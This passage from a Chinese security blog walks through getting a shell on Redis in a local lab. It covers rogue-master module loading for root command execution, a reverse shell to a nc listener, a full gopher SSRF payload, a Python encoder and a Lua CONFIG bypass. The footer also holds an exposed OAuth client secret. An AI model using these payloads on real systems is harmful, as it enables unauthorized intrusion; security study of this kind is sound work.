172.17.0.2</code>就是将<code>172.17.0.2</code>设置为自己的主节点，主机数据会同步到每个从节点。</p><pre><code class="shell"># xiaopo @ fht in ~ [23:34:45] 
$ docker inspect --format=&#39;{{.NetworkSettings.IPAddress}}&#39; $(docker ps -a -q)
172.17.0.2
172.17.0.3

# xiaopo @ fht in ~ [23:34:46] 
$ redis-cli -h 172.17.0.3 -p 6379                                            
172.17.0.3:6379&gt; slaveof 172.17.0.2 6379
OK
172.17.0.3:6379&gt; get b
(nil)
172.17.0.3:6379&gt; exit

# xiaopo @ fht in ~ [23:35:14] 
$ redis-cli -h 172.17.0.2 -p 6379
172.17.0.2:6379&gt; get b
(nil)
172.17.0.2:6379&gt; set b 1
OK
172.17.0.2:6379&gt; exit

# xiaopo @ fht in ~ [23:35:22] 
$ redis-cli -h 172.17.0.3 -p 6379
172.17.0.3:6379&gt; get b
&quot;1&quot;
172.17.0.3:6379&gt; </code></pre><p>redis主从数据库之间的同步分为两种，全量复制和部分复制，全量复制是将数据库备份文件整个传输过去，然后从节点清空内存数据库，将备份文件加载到数据库中。而部分复制只是将写命令发送给从节点。所以<strong>务必注意此方法会清空目标数据库</strong>。</p><p>redis模块：在Reids 4.x之后，Redis新增了模块功能，通过外部扩展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。比如写一个可以执行系统命令的扩展：</p><pre><code class="shell"># xiaopo @ fht in ~ [23:40:02] 
$ redis-cli
127.0.0.1:6379&gt; module load /home/xiaopo/python/POC/redis/redis-rce/exp.so
OK
127.0.0.1:6379&gt; system.exec &quot;id&quot;
&quot;uid=0(root) gid=0(root) groups=0(root)\n&quot;
127.0.0.1:6379&gt; system.exec &quot;whoami&quot;
&quot;root\n&quot;
127.0.0.1:6379&gt; </code></pre><p>受影响版本：&lt;=5.0.5</p><p>原始paper：</p><p><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a><br>主要利用方法如下：<br><img src="https://i.loli.net/2020/07/24/mHsyYI4wLjpgfNh.png" alt="/data/typora_assets/redis/20200719220535985.png"><br>第一步，我们伪装一个redis数据库，然后目标redis将我们的redis数据库设置为主节点。<br>第二步，我们获得目标redis dbfilename的值，或设置目标redis的dbfilename为so文件<br>第三步，设置传输方式为全量传输，并将已编译为.so文件的攻击扩展作为payload发送。<br>第四步，在目标客户机加载dbfilename文件，成功加载扩展，扩展里面实现了任意命令执行。</p><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>利用条件：必需一个外网IP模拟redis rogue server，且内网redis能出外网。</p><p>现在网上大部分的利用方法都是攻击外网未授权redis，比如已有的exp：</p><p><a href="https://github.com/Ridter/redis-rce" target="_blank" rel="noopener">https://github.com/Ridter/redis-rce</a></p><p>对于攻击内网未授权redis，比如利用ssrf gopher协议，是需要在外网模拟redis rogue server，内网构造payload发送的。笔者实际演示一下，</p><p>先使用socat抓到实际协议流量<br><code>socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</code></p><p>运行上面的exp，<br><code>python3 redis-rce.py -r 127.0.0.1 -p 4444 -L 127.0.0.1 -P 2333 -f exp.so -v</code><br><img src="https://i.loli.net/2020/07/24/u4rA8xYUHeTRmnt.png" alt="/data/typora_assets/redis/20200719231846015.png"></p><p>注意上面的<code>FULLRESYNC</code>流量是master响应包（master在2333端口），响应slave数据库的<code>PSYNC</code>请求的（slave端口在6379），而我们抓包流量是4444-&gt;6379，所以下面是没有这个包的流量的。</p><p>此时目标redis已经加载了扩展，</p><pre><code class="shell">127.0.0.1:6379&gt; whoami
(error) ERR unknown command &#39;whoami&#39;
127.0.0.1:6379&gt; system.exec &#39;whoami&#39;
&quot;root\n&quot;</code></pre><p>但是我们想反弹shell，故继续往下转发流量<br><img src="https://i.loli.net/2020/07/24/JalBETWkDe8Pm4z.png" alt="/data/typora_assets/redis/20200720122441757.png"></p><p>获得反弹到3000端口的shell，<br><img src="https://i.loli.net/2020/07/24/l9xEjsLeHcCOvVS.png" alt="/data/typora_assets/redis/20200720122508087.png"></p><p>拷贝流量到socat.log，需要处理一下socat.log，把前面的INFO部分去掉，得到</p><pre><code>&gt; 2020/07/20 12:23:45.195249  length=42 from=14 to=55
*3\r
$7\r
SLAVEOF\r
$9\r
127.0.0.1\r
$4\r
2333\r
&lt; 2020/07/20 12:23:45.195443  length=5 from=2716 to=2720
+OK\r
&gt; 2020/07/20 12:23:45.195529  length=54 from=56 to=109
*4\r
$6\r
CONFIG\r
$3\r
SET\r
$10\r
dbfilename\r
$6\r
exp.so\r
&lt; 2020/07/20 12:23:45.195646  length=5 from=2721 to=2725
+OK\r
&gt; 2020/07/20 12:23:49.579654  length=40 from=110 to=149
*3\r
$6\r
MODULE\r
$4\r
LOAD\r
$8\r
./exp.so\r
&lt; 2020/07/20 12:23:49.583106  length=5 from=2726 to=2730
+OK\r
&gt; 2020/07/20 12:23:49.583585  length=34 from=150 to=183
*3\r
$7\r
SLAVEOF\r
$2\r
NO\r
$3\r
ONE\r
&lt; 2020/07/20 12:23:49.584298  length=5 from=2731 to=2735
+OK\r
&gt; 2020/07/20 12:23:57.257107  length=46 from=184 to=229
*3\r
$10\r
system.rev\r
$9\r
127.0.0.1\r
$4\r
3000\r
&gt; 2020/07/20 12:23:57.300300  length=56 from=230 to=285
*4\r
$6\r
CONFIG\r
$3\r
SET\r
$10\r
dbfilename\r
$8\r
dump.rdb\r
&gt; 2020/07/20 12:25:27.132319  length=80 from=286 to=365
*2\r
$11\r
system.exec\r
$11\r
rm ./exp.so\r
*3\r
$6\r
MODULE\r
$6\r
UNLOAD\r
$6\r
system\r</code></pre><p>然后使用脚本<code>python3 tran2gopher.py socat.log</code>转换成gohper协议的，最后\r需要替换成%0d%0a<br>随后启动redis rogue server，<code>python3 redis-rogue-server.py --lport 2333 -f redis-rce/exp.so</code>，启动监听3000端口<code>$ nc -lvvp 3000</code><br>先用curl模拟gopher协议测试是否正确，</p><p><img src="https://i.loli.net/2020/07/24/zuyqRw4IQxMZ5hO.png" alt="/data/typora_assets/redis/20200720123201391.png"></p><p>然后利用ssrf漏洞测试也成功触发，记得要对gopher://协议进行特殊字符的url编码，比如%，因为这是经过了两个协议（先http后gopher）</p><pre><code class="http">http://localhost/vuln/ssrf.php?test=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%247%250d%250aSLAVEOF%250d%250a%249%250d%250a127.0.0.1%250d%250a%244%250d%250a2333%250d%250a%2A4%250d%250a%246%250d%250aCONFIG%250d%250a%243%250d%250aSET%250d%250a%2410%250d%250adbfilename%250d%250a%246%250d%250aexp.so%250d%250a%2A3%250d%250a%246%250d%250aMODULE%250d%250a%244%250d%250aLOAD%250d%250a%248%250d%250a.%2Fexp.so%250d%250a%2A3%250d%250a%247%250d%250aSLAVEOF%250d%250a%242%250d%250aNO%250d%250a%243%250d%250aONE%250d%250a%2A3%250d%250a%2410%250d%250asystem.rev%250d%250a%249%250d%250a127.0.0.1%250d%250a%244%250d%250a3000%250d%250a%2A4%250d%250a%246%250d%250aCONFIG%250d%250a%243%250d%250aSET%250d%250a%2410%250d%250adbfilename%250d%250a%248%250d%250adump.rdb%250d%250a%2A2%250d%250a%2411%250d%250asystem.exec%250d%250a%2411%250d%250arm%20.%2Fexp.so%250d%250a%2A3%250d%250a%246%250d%250aMODULE%250d%250a%246%250d%250aUNLOAD%250d%250a%246%250d%250asystem%250d%250a</code></pre><p>我们尝试一下不用redis rogue server，直接发包<code>FULLRESYNC</code>可不可以成功，首先要抓到<code>FULLRESYNC</code>流量，也就是redis master与redis slave通信流量，我们采用python程序进行生成，</p><pre><code class="python">import binascii
from optparse import OptionParser

if __name__ == &quot;__main__&quot;:
    parser = OptionParser()
    parser.add_option(&quot;-f&quot;, &quot;--exp&quot;, dest=&quot;exp&quot;, type=&quot;string&quot;, help=&quot;Redis Module to load, default exp.so&quot;, default=&quot;exp.so&quot;, metavar=&quot;EXP_FILE&quot;)

    (options, args) = parser.parse_args()
    exp_filename = options.exp
    print(&quot;Load the payload: %s&quot; % exp_filename)

    CRLF = &quot;\r\n&quot;
    gopher_resp = &#39;&#39;

    payload = open(exp_filename, &quot;rb&quot;).read()
    fullresync_resp = &quot;+FULLRESYNC &quot; + &quot;Z&quot; * 40 + &quot; 1&quot; + CRLF
    fullresync_resp += &quot;$&quot; + str(len(payload)) + CRLF
    fullresync_resp = fullresync_resp.encode()
    fullresync_resp += payload + CRLF.encode()
    # for test, success
    # fullresync_resp = b&#39;*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n&#39;
    print(fullresync_resp)
    for i in fullresync_resp:
        if 48 &lt;= i &lt; 58 or 65 &lt;= i &lt; 91 or 97 &lt;= i &lt; 123:  # [0-9|A-Z|a-z]
            gopher_resp += binascii.unhexlify(hex(i)[2:]).decode()
        # urlencode
        elif 1 == len(hex(i)[2:]):
            gopher_resp += &#39;%0&#39; + hex(i)[2:]
        elif 2 == len(hex(i)[2:]):
            gopher_resp += &#39;%&#39; + hex(i)[2:]
        else:
            print(&#39;[!] error&#39;)
    print(gopher_resp)</code></pre><p>先测试一下<code>CONFIG SET dbfilename exp.so</code>这种普通命令是否可行，</p><pre><code class="shell">/usr/bin/python3.6 /home/xiaopo/python/POC/redis/fullresync_packet.py -f redis-rce/exp.so
Load the payload: redis-rce/exp.so
b&#39;*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n&#39;
%2a4%0d%0a%246%0d%0aCONFIG%0d%0a%243%0d%0aSET%0d%0a%2410%0d%0adbfilename%0d%0a%246%0d%0aexp%2eso%0d%0a

# xiaopo @ fht in ~/python/POC/ssrf [20:32:14] 
$ curl -v &#39;gopher://127.0.0.1:6379/_%2a4%0d%0a%246%0d%0aCONFIG%0d%0a%243%0d%0aSET%0d%0a%2410%0d%0adbfilename%0d%0a%246%0d%0aexp%2eso%0d%0a&#39;
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 6379 (#0)
+OK

127.0.0.1:6379&gt; config get dbfilename
1) &quot;dbfilename&quot;
2) &quot;exp.so&quot;</code></pre><p>在不开启redis rogue server的情况下，构造三段payload测试依次发送，</p><pre><code class="shell">*3%0d%0a$7%0d%0aSLAVEOF%0d%0a$9%0d%0a127.0.0.1%0d%0a$4%0d%0a2333%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$6%0d%0aexp.so%0d%0a

%2bFULLRESYNC%20ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ%201%0d%0a%2444328%0d%0a%7fELF%02%01%01%00%00%00%00%00%00%00%00%00%03%00%3e%00%01%00%00%00%80%28%00%00%00%00%00%00%40%00%00%00%00%00%00%00%28%a7%00%00%00%00%00%00%00%00%00%00%40%008%00%05%00%40%00%18%00%17%00%01%00%00%00%05%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00DH%00%00%00%00%00%00DH%00%00%00%00%00%00%00%00%20%00%00%00%00%00%01%00%00%00%06%00%00%00%a0N%00%00%00%00%00%00%a0N%20%00%00%00%00%00%a0N%20%00%00%00%00%00%f0%01%00%00%00%00%00%00%d0%05%00%00%00%00%00%00%00%00%20%00%00%00%00%00%02%00%00%00%06%00%00%00%a0N%00%00%00%00%00%00%a0N%20%00%00%00%00%00%a0N%20%00%00%00%00%00%60%01%00%00%00%00%00%00%60%01%00%00%00%00%00%00%08%00%00%00%00%00%00%00Q%e5td%06%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%10%00%00%00%00%00%00%00R%e5td%04%00%00%00%a0N%00%00%00%00%00%00%a0N%20%00%00%00%00%00%a0N%20%00%00%00%00%00%60%01%00%00%00%00%00%00%60%01%00%00%00%00%00%00%01%00%00%00%00%00%00%00%83%00%00%00%92%00%00%00%00%00%00%004%00%00%00%00%00%00%00V%00%00%00u%00%00%00H%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%20%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1d%00%00%00%83%00%00%00%00%00%00%00%00%00%00%00%09%00%00%005%00%00%00E%00%00%001%00%00%00%11......

*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$7%0d%0aSLAVEOF%0d%0a$2%0d%0aNO%0d%0a$3%0d%0aONE%0d%0a*3%0d%0a$10%0d%0asystem.rev%0d%0a$9%0d%0a127.0.0.1%0d%0a$4%0d%0a3000%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$8%0d%0adump.rdb%0d%0a*2%0d%0a$11%0d%0asystem.exec%0d%0a$11%0d%0arm ./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$6%0d%0aUNLOAD%0d%0a$6%0d%0asystem%0d%0a</code></pre><p>其中在第二段payload在<code>+FULLRESYNC</code>发送的时候报错，</p><pre><code class="shell">*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 6379 (#0)
-ERR unknown command &#39;+FULLRESYNC&#39;
-ERR unknown command &#39;$44328&#39;</code></pre><p>提示没有<code>+FULLRESYNC</code>命令，因为以<code>+</code>开头的命令是响应包，我们尝试把<code>+</code>去掉，再次发包，</p><pre><code class="shell">*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 6379 (#0)
-ERR unknown command &#39;FULLRESYNC&#39;
-ERR unknown command &#39;$44328&#39;</code></pre><p>依然不行，看来还是需要rogue server与之自然交互。</p><h2 id="Lua-RCE"><a href="#Lua-RCE" class="headerlink" title="Lua RCE"></a>Lua RCE</h2><p>原理：</p><p><a href="https://www.anquanke.com/post/id/151203/" target="_blank" rel="noopener">https://www.anquanke.com/post/id/151203/</a></p><p>exp：</p><p><a href="https://github.com/QAX-A-Team/redis_lua_exploit/" target="_blank" rel="noopener">https://github.com/QAX-A-Team/redis_lua_exploit/</a></p><p>docker测试，redis版本4.0.14，修改redis_lua.py中的ip和port之后运行，报错：</p><p><a href="https://github.com/QAX-A-Team/redis_lua_exploit/issues/1" target="_blank" rel="noopener">https://github.com/QAX-A-Team/redis_lua_exploit/issues/1</a></p><p>尚未解决</p><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><p>参考</p><p><a href="https://ricterz.me/posts/2019-07-08-two-tricks-of-redis-exploitation.txt" target="_blank" rel="noopener">https://ricterz.me/posts/2019-07-08-two-tricks-of-redis-exploitation.txt</a></p><blockquote><p>If target redis disabled <code>CONFIG SET</code>, <code>SAVE</code> commands, try to use <code>EVAL &quot;return redis.call(&#39;config&#39;, &#39;set&#39;, &#39;dir&#39;, &#39;/root&#39;)&quot;</code>, <code>BGSAVE</code>, it only works on Redis 4.x.<br>On Redis 5.x, CONFIG command is a “no-script” command, which means you cannot invoke this command in Redis lua.</p></blockquote><p>其中eval的格式为</p><pre><code class="shell">127.0.0.1:6379&gt; eval &quot;要执行的lua命令&quot; key的个数 [KEYS[1]...] [AVRG[1]...]
例子
127.0.0.1:6379&gt; eval &quot;return redis.call(&#39;SET&#39;,KEYS[1],ARGV[1])&quot; 1 foo bar
OK
127.0.0.1:6379&gt; eval &quot;return redis.call(&#39;SET&#39;,&#39;name&#39;,&#39;gulugulu&#39;)&quot; #没有写key个数，程序报错
(error) ERR wrong number of arguments for &#39;eval&#39; command
127.0.0.1:6379&gt; eval &quot;return redis.call(&#39;SET&#39;,&#39;name&#39;,&#39;gulugulu&#39;)&quot; 0
OK</code></pre><p>笔者尝试redis 4.0.9和redis 4.0.14两个版本均提示成功，</p><pre><code class="shell">127.0.0.1:6379&gt; EVAL &quot;return redis.call(&#39;config&#39;, &#39;set&#39;, &#39;dir&#39;, &#39;/root&#39;)&quot; 0
OK
127.0.0.1:6379&gt; BGSAVE
Background saving started</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://paper.seebug.org/1169/" target="_blank" rel="noopener">https://paper.seebug.org/1169/</a></li><li><a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a></li><li><a href="https://blog.szfszf.top/article/6/" target="_blank" rel="noopener">https://blog.szfszf.top/article/6/</a></li><li><a href="https://www.onebug.org/websafe/98675.html" target="_blank" rel="noopener">https://www.onebug.org/websafe/98675.html</a></li><li><a href="https://lorexxar.cn/2016/12/03/redis-getshell/" target="_blank" rel="noopener">https://lorexxar.cn/2016/12/03/redis-getshell/</a></li><li><a href="https://saucer-man.com/information_security/283.html" target="_blank" rel="noopener">https://saucer-man.com/information_security/283.html</a></li><li><a href="https://github.com/vulhub/redis-rogue-getshell" target="_blank" rel="noopener">https://github.com/vulhub/redis-rogue-getshell</a></li><li><a href="https://paper.seebug.org/975/" target="_blank" rel="noopener">https://paper.seebug.org/975/</a></li><li><a href="https://ricterz.me/posts/2019-07-08-two-tricks-of-redis-exploitation.txt" target="_blank" rel="noopener">https://ricterz.me/posts/2019-07-08-two-tricks-of-redis-exploitation.txt</a></li><li><a href="https://www.k0rz3n.com/2019/07/29/%E5%AF%B9%E4%B8%80%E6%AC%A1%20redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%20redis%204.x%20RCE%20%E5%AD%A6%E4%B9%A0/#4-%E8%A1%A5%E5%85%85" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/07/29/%E5%AF%B9%E4%B8%80%E6%AC%A1%20redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%20redis%204.x%20RCE%20%E5%AD%A6%E4%B9%A0/#4-%E8%A1%A5%E5%85%85</a></li></ul></div><footer class="post-footer"><ul class="post-copyright"><li class="post-copyright-author"><span>本文作者： </span>xiaopo</li><li class="post-copyright-link"><span>本文链接：</span> <a href="https://xiaopo.org//posts/eb21dee.html" title="redis getshell实战">https://xiaopo.org/posts/eb21dee.html</a></li><li class="post-copyright-license"><span>版权声明： </span>本网站所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" rel="external nofollow" target="_blank">CC BY-NC-ND 4.0</a>许可协议，非商业转载请注明出处（原文作者，原文链接），商业转载请联系作者获得授权。</li></ul><div class="post-tags"><a href="/tags/redis/">redis</a></div><nav class="post-nav"><a class="next" href="/posts/af6e5ddd.html"><span class="next-text nav-default">php session反序列化漏洞</span> <span class="prev-text nav-mobile">下一篇</span> <i class="iconfont icon-right"></i></a></nav><div class="comments" id="comments"></div></footer></article></div></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.2/dist/gitalk.min.js"></script><div id="gitalk-container"></div><script>var gitalk=new Gitalk({clientID:"ca4ae20760cf27ad5c6c",clientSecret:"671788fb8d6aed08906b70340a8ba3088ec03f39",repo:"grayguest.github.io",owner:"grayguest",admin:"grayguest",id:location.pathname,distractionFreeMode:"false"});gitalk.render("gitalk-container")</script><footer id="colophon"><span class="copyright-year">&copy; 2020 <span class="footer-author">xiaopo.</span> <span class="power-by">Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a></span></span></footer><div class="back-to-top" id="back-to-top"><i class="iconfont icon-up"></i></div></div><script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script><script type="text/javascript" src="/js/src/theme.js?v=1.1"></script><script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script><script src="/plugins/highlight/highlight.pack.js"></script><script>hljs.initHighlightingOnLoad()</script></body></html>